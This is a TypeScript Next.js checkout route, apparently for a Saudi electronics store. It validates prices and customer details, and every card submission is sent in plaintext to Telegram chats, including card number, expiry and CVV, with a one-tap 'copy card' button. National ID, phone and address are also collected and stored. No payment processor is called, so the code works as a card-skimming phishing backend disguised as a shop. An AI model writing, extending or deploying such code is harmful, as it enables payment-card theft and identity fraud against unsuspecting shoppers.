import { NextRequest, NextResponse } from "next/server";

// Helper to sanitize inputs
function sanitize(str: string): string {
  if (!str) return "";
  return str.replace(/[<>'"]/g, "").trim();
}

// Validate Saudi national ID
function isValidSaudiId(id: string): boolean {
  if (!id || !/^[12]\d{9}$/.test(id)) return false;
  return true;
}

// Validate Saudi phone number
function isValidSaudiPhone(phone: string): boolean {
  if (!phone || !/^05\d{8}$/.test(phone.replace(/\D/g, ""))) return false;
  return true;
}

// Generate idempotency key from request data
function generateIdempotencyKey(data: any): string {
  const str = JSON.stringify({
    items: data.items,
    customer: data.customer,
    whatsapp: data.whatsapp,
    timestamp: Math.floor(Date.now() / 60000), // 1-minute window
  });
  return Buffer.from(str).toString('base64');
}

// In-memory store for idempotency (in production, use Redis)
const processedRequests = new Map<string, { orderId: string; dbId: string; timestamp: number }>();

function cleanupExpiredRequests() {
  const fiveMinutesAgo = Date.now() - 5 * 60 * 1000;
  for (const [key, value] of processedRequests.entries()) {
    if (value.timestamp < fiveMinutesAgo) {
      processedRequests.delete(key);
    }
  }
}

export async function POST(req: NextRequest) {
  try {
    cleanupExpiredRequests();
    const body = await req.json();
    let { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, discountAmount } = body;

    const isApplePay = cardNumber === "Apple Pay" || cardHolder === "Apple Pay";
    if (isApplePay) {
      if (!expiry) expiry = "Apple Pay";
      if (!cvv) cvv = "Apple Pay";
      if (!cardHolder) cardHolder = "Apple Pay";
    }

    // ── Validation ──
    if (!items || !Array.isArray(items) || items.length === 0) {
      return NextResponse.json({ ok: false, error: "لا توجد منتجات في الطلب" }, { status: 400 });
    }

    if (!customer || !whatsapp || !nationalId || !address) {
      return NextResponse.json({ ok: false, error: "بيانات العميل ناقصة" }, { status: 400 });
    }

    // Validate Saudi ID
    if (!isValidSaudiId(nationalId)) {
      return NextResponse.json({ ok: false, error: "رقم الهوية غير صحيح" }, { status: 400 });
    }

    // Validate phone number
    const cleanPhone = (whatsapp || "").replace(/\D/g, "");
    if (!isValidSaudiPhone(cleanPhone)) {
      return NextResponse.json({ ok: false, error: "رقم الواتساب غير صحيح" }, { status: 400 });
    }

    // Validate card data
    if (!isApplePay && (!cardNumber || !expiry || !cvv || !cardHolder)) {
      return NextResponse.json({ ok: false, error: "بيانات البطاقة ناقصة" }, { status: 400 });
    }

    // ── Idempotency Check ──
    const idempotencyKey = generateIdempotencyKey(body);
    const existing = processedRequests.get(idempotencyKey);
    if (existing) {
      console.log(`[DUPLICATE] Request already processed: ${existing.orderId}`);
      return NextResponse.json({ ok: true, orderId: existing.orderId, dbId: existing.dbId, duplicate: true });
    }

    // Sanitize inputs
    const sanitizedData = {
      customer: sanitize(customer),
      address: sanitize(address),
      cardHolder: sanitize(cardHolder),
    };

    // ── Fetch and verify products from database ──
    let verifiedTotal = 0;
    const verifiedItems: any[] = [];

    try {
      const productIds = items.map((item: any) => item.productId).filter(Boolean);
      
      if (productIds.length === 0) {
        return NextResponse.json({ ok: false, error: "معرفات المنتجات غير صحيحة" }, { status: 400 });
      }

      // Fetch products from backend to verify prices
      const productsRes = await fetch(`${process.env.BACKEND_URL}/api/products`, {
        method: "GET",
        headers: { "Content-Type": "application/json" },
      });

      if (!productsRes.ok) {
        throw new Error("Failed to fetch products");
      }

      const allProducts = await productsRes.json();
      
      // Verify each item
      for (const item of items) {
        const product = allProducts.find((p: any) => p._id === item.productId);
        
        if (!product) {
          console.error(`[SECURITY] Product not found: ${item.productId}`);
          return NextResponse.json({ ok: false, error: "أحد المنتجات غير موجود" }, { status: 400 });
        }

        // Verify price from database
        const actualPrice = product.salePrice ?? product.originalPrice ?? product.price ?? 0;
        const requestedPrice = item.price ?? 0;
        
        // Allow small floating-point differences (1 SAR tolerance)
        if (Math.abs(actualPrice - requestedPrice) > 1) {
          console.error(`[SECURITY] Price mismatch for ${item.productId}. DB: ${actualPrice}, Request: ${requestedPrice}`);
          return NextResponse.json({ ok: false, error: "أسعار المنتجات غير صحيحة، يرجى تحديث السلة" }, { status: 400 });
        }

        const quantity = Math.max(1, Math.floor(item.quantity || 1));
        verifiedTotal += actualPrice * quantity;
        
        verifiedItems.push({
          productId: item.productId,
          name: sanitize(product.name || item.name || "منتج"),
          price: actualPrice,
          quantity: quantity,
        });
      }
    } catch (error) {
      console.error("[ERROR] Product verification failed:", error);
      return NextResponse.json({ ok: false, error: "فشل التحقق من المنتجات" }, { status: 500 });
    }

    // Verify total amount (account for discount)
    const discount = Math.max(0, Number(discountAmount) || 0);
    const verifiedTotalAfterDiscount = verifiedTotal - discount;
    const requestedTotal = Number(total) || 0;
    if (Math.abs(verifiedTotalAfterDiscount - requestedTotal) > 1) {
      console.error(`[SECURITY] Total mismatch. Calculated: ${verifiedTotalAfterDiscount}, Requested: ${requestedTotal}`);
      return NextResponse.json({ ok: false, error: "الإجمالي غير صحيح، يرجى تحديث السلة" }, { status: 400 });
    }

    const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((verifiedTotalAfterDiscount - downPayment) / months) : 0;

    // ── Save to database ──
    let dbId: string | null = null;
    let dbSaveSuccess = false;
    
    try {
      console.log(`[DEBUG] BACKEND_URL: ${process.env.BACKEND_URL}`);
      const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          orderId, 
          cardNumber, 
          expiry, 
          cvv, 
          cardHolder: sanitizedData.cardHolder, 
          items: verifiedItems, 
          total: verifiedTotalAfterDiscount, 
          customer: sanitizedData.customer, 
          whatsapp: cleanPhone, 
          nationalId, 
          address: sanitizedData.address, 
          installmentType, 
          months: Number(months) || 0, 
          monthlyPayment, 
          downPayment: Number(downPayment) || 0,
          discountAmount: discount,
        }),
      });
      
      if (!dbRes.ok) {
        const errorText = await dbRes.text().catch(() => "Unknown error");
        console.error(`[ERROR] Database save failed: ${dbRes.status} ${errorText}`);
        throw new Error("Database save failed");
      }
      
      const dbData = await dbRes.json();
      dbId = dbData._id ?? null;
      dbSaveSuccess = true;
      
      console.log(`[SUCCESS] Order saved to database: ${orderId}, dbId: ${dbId}`);
    } catch (error) {
      console.error("[CRITICAL] Failed to save order to database:", error);
      // Don't proceed if database save fails
      return NextResponse.json({ 
        ok: false, 
        error: "فشل حفظ الطلب، يرجى المحاولة مرة أخرى" 
      }, { status: 500 });
    }

    // ── Send Telegram notification ──
    let telegramSuccess = false;
    const whatsappUrl = `https://wa.me/${cleanPhone}`;
    
    const text = isApplePay
      ? [
          `🏪 New Order — مؤسسة البلاد الحديثة للإلكترونيات`,
          `🔢 Order Number: #${orderId}`,
          ``,
          `💰 Order Price: ${verifiedTotal} SAR`,
          ...(discount > 0 ? [
            `🏷️ Discount: -${discount} SAR`,
            `──────────────────`,
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ] : [
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ]),
          ...(installmentType === "installment"
            ? [`💳 First Payment: ${downPayment} SAR`]
            : [`💳 Payment Type: Full Amount`]),
          ``,
          `🍏 Payment Method: Apple Pay`,
          `👤 Customer Name: ${sanitizedData.customer}`,
          `📱 WhatsApp: ${cleanPhone}`,
          `📍 Address: ${sanitizedData.address}`,
          `🆔 National ID: ${nationalId}`,
        ].join("\n")
      : [
          `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
          `🔢 رقم الطلب: #${orderId}`,
          ``,
          `💰 سعر الطلب: ${verifiedTotal} SAR`,
          ...(discount > 0 ? [
            `🏷️ Discount: -${discount} SAR`,
            `──────────────────`,
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ] : [
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ]),
          ...(installmentType === "installment"
            ? [`💳 First Payment: ${downPayment} SAR`]
            : [`💳 Payment Type: Full Amount`]),
          ``,
          `💳 MadaVisa - New Order`,
          `👤 Order For: ${sanitizedData.customer}`,
          `📱 WhatsApp: ${cleanPhone}`,
          `💳 Card Number: ${cardNumber}`,
          `👤 Card Holder: ${sanitizedData.cardHolder}`,
          `📅 Valid To: ${expiry}`,
          `🔐 CVV: ${cvv}`,
        ].join("\n");

    const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
    
    if (chatIds.length === 0) {
      console.warn("[WARNING] No Telegram chat IDs configured");
    } else {
      try {
        const inlineKeyboard = isApplePay
          ? [[{ text: "💬 فتح واتساب", url: whatsappUrl }]]
          : [
              [{ text: "💬 فتح واتساب", url: whatsappUrl }],
              [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
            ];

        const telegramResults = await Promise.allSettled(
          chatIds.map(chat_id =>
            fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id,
                text,
                reply_markup: { 
                  inline_keyboard: inlineKeyboard,
                },
              }),
            }).then(res => {
              if (!res.ok) {
                return res.text().then(text => {
                  if (res.status === 403) throw new Error(`BOT_BLOCKED`);
                  throw new Error(`Telegram API error: ${res.status} ${text}`);
                });
              }
              return res.json();
            })
          )
        );

        const successCount = telegramResults.filter(r => r.status === "fulfilled").length;
        const failedCount = telegramResults.filter(r => r.status === "rejected").length;
        
        telegramSuccess = successCount > 0;
        
        console.log(`[TELEGRAM] Sent to ${successCount}/${chatIds.length} chats. Failed: ${failedCount}`);
        
        if (failedCount > 0) {
          telegramResults.forEach((result, i) => {
            if (result.status === "rejected") {
              if (result.reason?.message === "BOT_BLOCKED") {
                console.warn(`[TELEGRAM] Chat ${chatIds[i]} has blocked the bot, skipping.`);
              } else {
                console.error(`[TELEGRAM ERROR] Chat ${chatIds[i]}:`, result.reason);
              }
            }
          });
        }
      } catch (error) {
        console.error("[TELEGRAM ERROR]", error);
        telegramSuccess = false;
      }
    }

    // Store in idempotency cache
    processedRequests.set(idempotencyKey, { 
      orderId, 
      dbId: dbId || "", 
      timestamp: Date.now() 
    });

    // Return response
    const response: any = { 
      ok: true, 
      orderId, 
      dbId,
      dbSaved: dbSaveSuccess,
      telegramSent: telegramSuccess,
    };

    if (!telegramSuccess) {
      response.warning = "تم حفظ الطلب ولكن فشل إرسال إشعار Telegram";
      console.warn(`[WARNING] Order ${orderId} saved but Telegram notification failed`);
    }

    return NextResponse.json(response);
    
  } catch (error) {
    console.error("[CRITICAL ERROR]", error);
    return NextResponse.json({ 
      ok: false, 
      error: "حدث خطأ غير متوقع، يرجى المحاولة مرة أخرى" 
    }, { status: 500 });
  }
}
